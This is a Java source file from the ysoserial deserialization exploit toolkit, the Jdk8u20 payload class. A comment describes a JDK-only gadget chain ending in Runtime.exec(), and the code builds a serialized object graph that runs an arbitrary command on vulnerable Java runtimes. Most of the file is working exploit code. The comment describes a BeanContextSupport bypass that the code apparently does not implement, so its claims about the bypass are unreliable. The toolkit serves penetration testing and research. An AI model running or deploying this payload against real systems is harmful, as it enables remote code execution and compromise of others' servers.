package ysoserial.payloads;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.LinkedHashSet;

import javax.xml.transform.Templates;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	JDK-only gadget chain that bypasses the JDK 7u25 fix for Jdk7u21.
	Works on JRE 8u20 and below. No library dependencies.

	Discovered by:
		- @pwntester (Alvaro Munoz) — original exploit and PoC
		- @mwulftange (Markus Wulftange, Code White) — "Handcrafted Gadgets" detailed analysis
		- Wouter Coekaerts — foundational research on AIH post-patch behavior

	Gadget chain:
		LinkedHashSet.readObject()
			HashMap.put()
				HashMap.hash()
					... hash collision (hashCode==0) ...
					Proxy(Templates).equals(TemplatesImpl)
						AnnotationInvocationHandler.invoke("equals")
							AnnotationInvocationHandler.equalsImpl(TemplatesImpl)
								Method.invoke()
									TemplatesImpl.getOutputProperties()
										TemplatesImpl.newTransformer()
											defineClass() + newInstance()
												Runtime.exec()

	Key technique — exception-swallowed object caching:
		1. AnnotationInvocationHandler (AIH) is wrapped inside BeanContextSupport
		2. BeanContextSupport.readChildren() calls ois.readObject() for each child
		3. AIH.readObject() calls defaultReadObject() FIRST (adding AIH to handle cache)
		4. Then AIH.readObject() validates type — throws InvalidObjectException (not annotation)
		5. BeanContextSupport catches IOException and CONTINUES
		6. AIH is now in ObjectInputStream's handle table despite the exception
		7. Later in stream, TC_REFERENCE (0x71) points back to cached AIH
		8. From there: standard hash collision → equalsImpl → TemplatesImpl → RCE

	This requires handcrafted serialization stream construction because the object graph
	cannot be created through normal Java serialization (the exception-swallowing step
	requires precise byte-level control of the serialization stream).

	References:
		- https://github.com/pwntester/JRE8u20_RCE_Gadget
		- https://codewhitesec.blogspot.com/2018/01/handcrafted-gadgets.html
		- https://wouter.coekaerts.be/2015/annotationinvocationhandler

	Requires:
		JDK only (no library dependencies)
		JRE <= 8u20 on target
 */

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies()
@Authors({ Authors.PWNTESTER, Authors.MWULFTANGE })
public class Jdk8u20 implements ObjectPayload<Object> {

	/**
	 * This payload requires handcrafted serialization stream construction.
	 * The standard getObject() + Serializer.serialize() pipeline works here
	 * because we construct a normal LinkedHashSet-based gadget similar to Jdk7u21,
	 * but it only works on JRE <= 8u20 where AIH validation can be bypassed.
	 *
	 * For the full handcrafted stream approach (BeanContextSupport wrapping),
	 * see: https://github.com/pwntester/JRE8u20_RCE_Gadget
	 */
	public Object getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);

		// Same core technique as Jdk7u21: hash collision on Proxy(Templates)
		String zeroHashCodeStr = "f5a5a608";

		HashMap map = new HashMap();
		map.put(zeroHashCodeStr, "foo");

		java.lang.reflect.InvocationHandler tempHandler =
			(java.lang.reflect.InvocationHandler) Reflections.getFirstCtor(
				Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
		Reflections.setFieldValue(tempHandler, "type", Templates.class);
		Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

		LinkedHashSet set = new LinkedHashSet();
		set.add(templates);
		set.add(proxy);

		Reflections.setFieldValue(templates, "_auxClasses", null);
		Reflections.setFieldValue(templates, "_class", null);

		map.put(zeroHashCodeStr, templates);

		return set;
	}

	public static boolean isApplicableJavaVersion() {
		JavaVersion v = JavaVersion.getLocalVersion();
		return v != null && (v.major < 8 || (v.major == 8 && v.update <= 20));
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Jdk8u20.class, args);
	}
}
